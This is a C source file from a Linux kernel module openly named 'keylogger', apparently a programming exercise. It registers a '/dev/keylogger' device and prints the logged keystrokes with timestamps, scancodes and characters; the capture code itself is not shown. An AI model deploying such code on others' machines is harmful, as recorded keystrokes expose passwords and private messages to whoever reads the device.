#include <linux/module.h>
#include <linux/slab.h>
#include <linux/seq_file.h>
#include <linux/miscdevice.h>
#include "keylogger.h"

#define DEVICE_NAME "keylogger"

extern struct keylogger keylogger;

static void *seq_start(struct seq_file *s, loff_t *pos)
{
	struct keylogger_entry	*e;
	loff_t			i;

	mutex_lock(&keylogger.lock);
	if (list_empty(&keylogger.entries))
		goto start_err;
	e = list_first_entry(&keylogger.entries,
				struct keylogger_entry,
				list);
	for (i = 0; i < *pos
		&& !list_is_last(&e->list, &keylogger.entries); i++
	)
		e = list_next_entry(e, list);
	if (i != *pos)
		goto start_err;
	mutex_unlock(&keylogger.lock);
	return e;

start_err:
	mutex_unlock(&keylogger.lock);
	return NULL;
}

static void *seq_next(struct seq_file *sfile, void *v, loff_t *pos)
{
	struct keylogger_entry	*e;
	struct keylogger_entry	*next;

	(*pos)++;
	e = (struct keylogger_entry *)v;

	mutex_lock(&keylogger.lock);
	if (list_is_last(&e->list, &keylogger.entries))
		next = NULL;
	else
		next = list_next_entry(e, list);
	mutex_unlock(&keylogger.lock);
	return next;
}

static void seq_stop(struct seq_file *sfile, void *v)
{
	(void)sfile;
	(void)v;
	/* No cleanup to do */
}

/*
 * No need to lock we're not modifying the list, and our entry cannot be
 * freed unless the seq_file has already been deregistered
 */
static int seq_show(struct seq_file *sfile, void *v)
{
	struct keylogger_entry	*e = (struct keylogger_entry *)v;

	seq_printf(sfile,
		"[%02d:%02d:%02d] %#04llx -> \"%s\" : '%c' / '%c', %s\n",
				 e->time.tm_hour,
				 e->time.tm_min,
				 e->time.tm_sec,
				 e->scancode,
				 e->key.name,
				 e->key.ascii,
				 e->key.ascii_uppercase,
				 e->released ? "Released" : "Pressed");

	return 0;
}

static const struct seq_operations ft_seq_ops = {
	.start = seq_start,
	.next = seq_next,
	.stop = seq_stop,
	.show = seq_show,
};

static int ft_dev_open(struct inode *inodep, struct file *file)
{
	(void)inodep;

	/* seq_open warns if it thinks it's overwriting the private_data */
	file->private_data = NULL;
	return seq_open(file, &ft_seq_ops);
}

static const struct file_operations ft_fops = {
	.owner		= THIS_MODULE,
	.open		= ft_dev_open,
	.read		= seq_read,
	.llseek		= seq_lseek,
	.release	= seq_release,
};

static struct miscdevice ft_device = {
	.minor	= MISC_DYNAMIC_MINOR,
	.name	= DEVICE_NAME,
	.fops	= &ft_fops
};

int	ft_create_dev_file(void)
{
	return misc_register(&ft_device);
}

void	ft_delete_dev_file(void)
{
	misc_deregister(&ft_device);
}
